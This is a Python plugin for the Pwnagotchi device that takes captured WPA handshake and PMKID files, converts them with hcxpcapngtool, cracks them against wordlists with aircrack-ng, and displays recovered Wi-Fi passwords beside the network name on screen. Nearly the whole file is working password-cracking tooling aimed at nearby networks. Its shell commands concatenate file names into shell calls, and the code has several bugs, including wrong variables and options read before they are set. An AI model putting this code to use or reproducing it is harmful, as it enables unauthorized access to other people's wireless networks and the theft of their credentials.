# Process:
#   on_handshake:
#       1. AircrackOnly
#           1. Check for Handshake
#           2. If no Handshake: check for PMKID
#       2. [OPTIONAL] If success: Hashie
#           1. Try creating an EAPOL file (.22000)
#           2. Try creating a PMKID file (.16800) (+ Repairing if needed)
#       3. If AircrackOnly success:
#           1. Try cracking handshake/PMKID (Quickdic)
#           2.1 Password cracked: display on screen on the next refresh
#           2.2 Password cracked: create .pcap.cracked file
#           3 If not cracked: remove handshake file (.pcap) and GPS file (.gps.json) if they exist
#####
# Config:
#   main.plugins.gps.enabled = true
#   main.plugins.gps.device = "/dev/ttyUSB0"
#   main.plugins.gps.speed = 19200
#
#   main.plugins.aftershake.enabled = true
#   [OPTIONAL] main.plugins.aftershake.wordlist_folder = "/root/wordlist_folder/" (default: "/root/wordlist_folder/")
#   [OPTIONAL] main.plugins.aftershake.hashie = false (default: true)
#   [OPTIONAL] main.plugins.aftershake.face = "(◕O◕)" (default: "(◕.◕)")
#####
# Requirements:
# - hcxpcapngtool (sudo apt-get -y install hcxtools)
# - aircrack-ng (sudo apt-get -y install aircrack-ng)
# NOTE: try running 'sudo run apt-get update' if you run into issues. Do NOT run 'sudo apt-get upgrade' as this can break your pwnagotchi installation.
#####
# Tested on:
#   Hardware:
#   - RPi Zero 2 W
#   - VK-172 (GPS)
#   Running: https://github.com/jayofelony/pwnagotchi/releases/tag/v2.8.6


import logging
import subprocess
import os
import re
import time
import shutil
from threading import Lock

import pwnagotchi.plugins as plugins
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts

class afterShake(plugins.Plugin):
    __author__ = 'xentrify'
    # credits to:
    # - junohea.mail@gmail.com (hashie-hcxpcapngtool)
    # - pwnagotchi@rossmarks.uk (quickdic AND AircrackOnly)
    # - @nagy_craig (display-password)

    __version__ = '1.0.1'
    __license__ = 'GPL3'
    __description__ = 'A plugin that handles everything after a handshake. AircrackOnly, Hashie, Quickdic, etc. All in one.'

    def __init__(self):
        self.ready = False
        self.last_cords = dict()
        self.options = dict()
        self.last_ssid = None
        self.last_pwd = None
        self.new = False
        self.lock = Lock()

        self.required = ["aircrack-ng"]
        self.found = list()
        self.checked = False
        self.correct_files = list()

        self.face = self.options["face"] if "face" in self.options else "(◕.◕)"
        self.use_hashie = self.options["hashie"] if "hashie" in self.options else False
        if self.use_hashie: self.required.extend(("hcxpcapngtool", "tcpdump"))
        self.wordlist_folder = self.options["wordlist_folder"] if "wordlist_folder" in self.options else "/root/wordlist_folder/"

    def on_loaded(self):
        logging.info("[afterShake] Plugin loaded")
        for package in self.required:
            check = subprocess.run(
                (f'/usr/bin/dpkg -l {package} | grep {package}' +' | awk \'{print $2, $3}\''), shell=True, stdout=subprocess.PIPE)
            check = check.stdout.decode('utf-8').strip()
            if check != f"{package} <none>":
                logging.info(f"[afterShake] {package} Found " + check)
                self.found.append("aircrack-ng")
            else:
                logging.warning(f"[afterShake] {package} is not installed!")
        self.checked = True

    def on_ready(self, agent):
        logging.info("[afterShake] Plugin is ready")
        while not self.checked:
            time.sleep(1)
        if len(self.found) == len(self.required):
            self.ready = True
        else:
            logging.warning("[afterShake] Not all requirements were found")
            self.ready = False
    def _cleanup(self, filename):
        removed = []
        if not os.path.exists("/root/handshakes-invalid/"):
            os.makedirs("/root/handshakes-invalid")
            logging.info("[afterShake] Created /root/handshakes-invalid/")

        if os.path.exists(filename):
            #head, tail = os.path.split(filename)
            #os.replace(filename, f"/root/invalid/{tail}")
            shutil.copy(filename, "/root/handshakes-invalid/")
            os.remove(filename)
            removed.append(filename)

        gps_file = filename.replace(".pcap", ".gps.json")
        if os.path.exists(gps_file):
            #head, tail = os.path.split(gps_file)
            #os.replace(gps_file, f"/root/invalid/{tail}")
            shutil.copy(filename, "/root/handshakes-invalid/")
            os.remove(gps_file)
            removed.append(gps_file)

        if removed:
            logging.info('[afterShake] Cleaned up:\n\t' + '\n\t'.join(removed))

    def check_all(self):
        logging.info("[afterShake] Checking all files...")
        for root, dirs, files in os.walk(os.path.abspath("/root/handshakes/")):
            for file in files:
                if file.endswith(".pcap"):
                    filename = os.path.join(root, file)
                    hs_check = subprocess.run(('/usr/bin/aircrack-ng ' + file + ' 2>/dev/null </dev/null | awk \'/1 handshake/ {print $2,$3; exit 0}\''),
                                              shell=True, stdout=subprocess.PIPE)
                    hs_check = [line.split() for line in hs_check.stdout.decode('utf-8').splitlines() if line.strip() != ""]
                    if len(hs_check) > 0:
                        success = True
                        bssid = (hs_check[0][0]).strip()
                        ssid = (hs_check[0][1]).strip()
                        logging.info(f"[afterShake] {filename} contains handshake for: {ssid} ({bssid})")
                    else:
                        # Check for PMKID using aircrack-ng
                        pmkid_check = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' 2>/dev/null </dev/null | awk \'/PMKID/ {print $2,$3; exit 0}\''),
                                                     shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                        pmkid_check = [line.split() for line in pmkid_check.stdout.decode('utf-8').splitlines() if
                                       line.strip() != ""]
                        if len(pmkid_check) > 0:
                            success = True
                            bssid = (pmkid_check[0][0]).strip()
                            ssid = (pmkid_check[0][1]).strip()
                            logging.info(f"[afterShake] {filename} contains PMKID for: {ssid} ({bssid})")
                        else:
                            success = False
                            self._cleanup(filename)
    def on_handshake(self, agent, filename, access_point, client_station):
        if self.ready:
            self.check_all()
            success = False
            bssid = None
            ssid = None

            # Check for handshake using aircrack-ng
            # https://github.com/evilsocket/pwnagotchi-plugins-contrib/blob/master/aircrackonly.py
            hs_check = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' 2>/dev/null </dev/null | awk \'/1 handshake/ {print $2,$3; exit 0}\''), shell=True, stdout=subprocess.PIPE)
            hs_check = [line.split() for line in hs_check.stdout.decode('utf-8').splitlines() if line.strip() != ""]
            if len(hs_check) > 0:
                success = True
                bssid = (hs_check[0][0]).strip()
                ssid = (hs_check[0][1]).strip()
                logging.info(f"[afterShake] {filename} contains handshake for: {ssid} ({bssid})")
            else:
                # Check for PMKID using aircrack-ng
                pmkid_check = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' 2>/dev/null </dev/null | awk \'/PMKID/ {print $2,$3; exit 0}\''), shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
                pmkid_check = [line.split() for line in pmkid_check.stdout.decode('utf-8').splitlines() if line.strip() != ""]
                if len(pmkid_check) > 0:
                    success = True
                    bssid = (pmkid_check[0][0]).strip()
                    ssid = (pmkid_check[0][1]).strip()
                    logging.info(f"[afterShake] {filename} contains PMKID for: {ssid} ({bssid})")
                else:
                    success = False
                    self._cleanup(filename)

            if success:

                if self.use_hashie:
                    # https://github.com/PwnPeter/pwnagotchi-plugins/blob/master/hashie-hcxpcapngtool.py
                    with self.lock:
                        handshake_status = []
                        path_noext = filename.split('.')[0]
                        name = filename.split('/')[-1:][0].split('.')[0]

                        if os.path.isfile(path_noext + '.22000'):
                            handshake_status.append('Already have {}.22000 (EAPOL)'.format(name))
                        elif self._writeEAPOL(filename):
                            handshake_status.append('Created {}.22000 (EAPOL) from pcap'.format(name))

                        if os.path.isfile(path_noext + '.16800'):
                            handshake_status.append('Already have {}.16800 (PMKID)'.format(name))
                        elif self._writePMKID(filename, access_point):
                            handshake_status.append('Created {}.16800 (PMKID) from pcap'.format(name))

                        if handshake_status:
                            logging.info('[afterShake] Good news:\n\t' + '\n\t'.join(handshake_status))

                # Try cracking the handshake
                # https://github.com/evilsocket/pwnagotchi-plugins-contrib/blob/master/quickdic.py

                crack_result = subprocess.run(('aircrack-ng -w `echo ' + self.options['wordlist_folder'] + '*.* | sed \'s/\ /,/g\'` -l ' + filename + '.cracked -q -b ' + bssid + ' ' + filename + " 2>/dev/null </dev/null | awk '/ESSID|KEY/'"), shell=True, stdout=subprocess.PIPE)
                crack_result = "".join(line for line in crack_result.stdout.decode('utf-8').splitlines() if line.strip() != "")
                if "ESSID" in crack_result:
                    logging.info(f"[afterShake] Cannot crack {filename} as the ESSID couldn't be found")
                else:
                    if crack_result and crack_result != "KEY NOT FOUND":
                        try:
                            key = re.search('\[(.*)\]',crack_result)
                            pwd = str(key.group(1))
                            self.new = True
                            self.last_pwd = pwd
                            self.last_ssid = ssid if ssid and ssid != "" and ssid != "hidden" and ssid != "<hidden>" else "hidden"
                            logging.info(f"[afterShake] Successfully cracked key ({pwd}) for: {ssid} ({bssid})")
                        except Exception as exc:
                            logging.info(f"[afterShake] Could not load password from the result: {exc}")
                    else:
                        logging.info(f"[afterShake] Could not crack key for: {ssid} ({bssid})")
        else:
            logging.info("[afterShake] on_handshake called, but not ready yet. Waiting until ready...")
            while not self.ready:
                time.sleep(1)
            logging.info(f"[afterShake] Ready!")
            self.on_handshake(agent=agent, filename=filename, access_point=access_point, client_station=client_station)

    def _writeEAPOL(self, fullpath):
        path_no_ext = fullpath.split('.')[0]
        filename = fullpath.split('/')[-1:][0].split('.')[0]
        result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(path_no_ext, fullpath))
        if os.path.isfile(path_no_ext + '.22000'):
            logging.debug('[afterShake] [+] EAPOL Success: {}.22000 created'.format(filename))
            return True
        else:
            return False

    def _writePMKID(self, fullpath, apJSON):
        path_no_ext = fullpath.split('.')[0]
        filename = fullpath.split('/')[-1:][0].split('.')[0]
        result = subprocess.getoutput('hcxpcapngtool -k {}.16800 {} >/dev/null 2>&1'.format(path_no_ext, fullpath))
        if os.path.isfile(path_no_ext + '.16800'):
            logging.debug('[afterShake] [+] PMKID Success: {}.16800 created'.format(filename))
            return True
        else:  # make a raw dump
            result = subprocess.getoutput(
                'hcxpcapngtool -K {}.16800 {} >/dev/null 2>&1'.format(path_no_ext, fullpath))
            if os.path.isfile(path_no_ext + '.16800'):
                if self._repairPMKID(fullpath, apJSON) == False:
                    logging.debug('[afterShake] [-] PMKID Fail: {}.16800 could not be repaired'.format(filename))
                    return False
                else:
                    logging.debug('[afterShake] [+] PMKID Success: {}.16800 repaired'.format(filename))
                    return True
            else:
                logging.debug(
                    '[afterShake] [-] Could not attempt repair of {} as no raw PMKID file was created'.format(filename))
                return False

    def _repairPMKID(self, fullpath, apJSON):
        hash_string = ""
        clientString = []
        path_no_ext = fullpath.split('.')[0]
        filename = fullpath.split('/')[-1:][0].split('.')[0]
        logging.debug('[afterShake] Repairing {}'.format(filename))
        with open(path_no_ext + '.16800', 'r') as tempFileA:
            hash_string = tempFileA.read()
        if apJSON != "":
            clientString.append('{}:{}'.format(apJSON['mac'].replace(':', ''), apJSON['hostname'].encode('hex')))
        else:
            # attempt to extract the AP's name via hcxpcapngtool
            result = subprocess.getoutput('hcxpcapngtool -X /tmp/{} {} >/dev/null 2>&1'.format(filename, fullpath))
            if os.path.isfile('/tmp/' + filename):
                with open('/tmp/' + filename, 'r') as tempFileB:
                    temp = tempFileB.read().splitlines()
                    for line in temp:
                        clientString.append(line.split(':')[0] + ':' + line.split(':')[1].strip('\n').encode().hex())
                os.remove('/tmp/{}'.format(filename))
            # attempt to extract the AP's name via tcpdump
            tcpCatOut = subprocess.check_output(
                "tcpdump -ennr " + fullpath + " \"(type mgt subtype beacon) || (type mgt subtype probe-resp) || (type mgt subtype reassoc-resp) || (type mgt subtype assoc-req)\" 2>/dev/null | sed -E 's/.*BSSID:([0-9a-fA-F:]{17}).*\\((.*)\\).*/\\1\t\\2/g'",
                shell=True).decode('utf-8')
            if ":" in tcpCatOut:
                for i in tcpCatOut.split('\n'):
                    if ":" in i:
                        clientString.append(
                            i.split('\t')[0].replace(':', '') + ':' + i.split('\t')[1].strip('\n').encode().hex())
        if clientString:
            for line in clientString:
                if line.split(':')[0] == hash_string.split(':')[1]:
                    # if the AP MAC pulled from the JSON or tcpdump output matches the AP MAC in the raw 16800 output
                    hash_string = hash_string.strip('\n') + ':' + (line.split(':')[1])
                    if (len(hash_string.split(':')) == 4) and not (hash_string.endswith(':')):
                        with open(fullpath.split('.')[0] + '.16800', 'w') as tempFileC:
                            logging.debug('[afterShake] Repaired: {} ({})'.format(filename, hash_string))
                            tempFileC.write(hash_string + '\n')
                        return True
                    else:
                        logging.debug('[afterShake] Discarded: {} {}'.format(line, hash_string))
        else:
            os.remove(fullpath.split('.')[0] + '.16800')
            return False

    def on_ui_setup(self, ui):
        # Without shame copied from https://github.com/c-nagy/pwnagotchi-display-password-plugin ;p
        if ui.is_waveshare_v2():
            h_pos = (0, 95)
            v_pos = (180, 61)
        elif ui.is_waveshare_v1():
            h_pos = (0, 95)
            v_pos = (170, 61)
        elif ui.is_waveshare144lcd():
            h_pos = (0, 92)
            v_pos = (78, 67)
        elif ui.is_inky():
            h_pos = (0, 83)
            v_pos = (165, 54)
        elif ui.is_waveshare27inch():
            h_pos = (0, 153)
            v_pos = (216, 122)
        else:
            h_pos = (0, 96)
            v_pos = (180, 61)

        if self.options['orientation'] == "vertical":
            ui.add_element('display-password', LabeledValue(color=BLACK, label='', value='',
                                                            position=v_pos,
                                                            label_font=fonts.Bold, text_font=fonts.Small))
        else:
            # default to horizontal
            ui.add_element('display-password', LabeledValue(color=BLACK, label='', value='',
                                                            position=h_pos,
                                                            label_font=fonts.Bold, text_font=fonts.Small))

    def on_unload(self, ui):
        with ui._lock:
            ui.remove_element('display-password')

    def on_ui_update(self, ui):
        if self.last_pwd and self.last_ssid:
            if self.new:
                ui.set("face", self.face)
            self.new = False
            ui.set('display-password', f"{self.last_ssid} [{self.last_pwd.strip()}]")
